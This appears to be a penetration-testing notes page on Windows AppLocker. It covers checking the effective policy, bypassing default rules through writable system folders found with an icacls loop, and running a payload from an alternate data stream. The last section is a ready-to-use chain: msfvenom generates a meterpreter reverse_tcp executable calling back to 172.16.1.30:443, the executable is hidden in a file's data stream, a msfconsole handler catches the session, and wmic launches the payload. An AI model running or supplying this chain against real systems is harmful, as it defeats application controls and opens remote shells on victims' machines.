# AppLocker

## Brief

{% hint style="info" %}
**AppLocker** can help you :

* Define **rules** based on file attributes that persist across app updates, such as the publisher name (derived from the digital signature), product name, file name, and file version. You can also create rules based on the file path and hash.
* Assign a rule to a security group or an individual user.
* Create **exceptions** to rules. For example, you can create a rule that allows all users to run all Windows binaries, except the Registry Editor (regedit.exe).
* Use audit-only mode to deploy the policy and understand its impact before enforcing it.
* Create rules on a staging server, test them, then export them to your production environment and import them into a Group Policy Object.
* Simplify creating and managing AppLocker rules by using Windows PowerShell.
{% endhint %}

## Check

```powershell
# check if it is running
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# check which files/extensions are blacklisted/whitelisted:
Get-ApplockerPolicy -Effective -xml

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

## ByPass

If AppLocker is configured with default AppLocker rules, we can bypass it by placing our executable in the following directory: _C:\Windows\System32\spool\drivers\color_ - Whitelisted by default.

{% embed url="https://github.com/api0cradle/UltimateAppLockerByPassList" %}
Check this
{% endembed %}

If AppLocker is configured with default AppLocker rules, we can bypass it by placing our executable in the following directory: _C:\Windows\System32\spool\drivers\color_ - Whitelisted by default.

```powershell
# confirm if applocker is running
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

### Default writeable folders

```
C:\Windows\Tasks
C:\Windows\Temp
C:\windows\tracing
C:\Windows\Registration\CRMLog
C:\Windows\System32\FxsTmp
C:\Windows\System32\com\dmp
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)
C:\Windows\SysWOW64\FxsTmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
```

```powershell
# copy the writeable folder into icalcs.txt ; then get permissions :
for /F %A in (C:\temp\icacls.txt) do ( cmd.exe /c icacls "%~A" 2>nul | findstr /i "(F) (M) (W) (R,W) (RX,WD) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. ) 

# copy the executable into writeable folder and execute it
# enjoy! 
```

### Alternate Data Stream

> Another technique that can be used to bypass AppLocker is by embedding an executable into another file (alternate data stream) and then executing the EXE from the ADS.

```powershell
# find which program we have write permissions :
icacls "C:\Program Files\Program\*"

# create payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.1.30 LPORT=443 -a x64 --platform Windows -f exe -o meterpreter64.exe

# embed the payload into the file we have permissions ; here is log.txt
type C:\temp\meterpreter64.exe > "C:\Program Files\Program\log.txt:meterpreter64.exe"

# catch the meterpreter 
msfconsole -q -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST 172.16.1.30;set LPORT 443;exploit;"

# execute it 
wmic process call create '"C:\Program Files\Program\log.txt:meterpreter64.exe"'

# meterpreter !
```
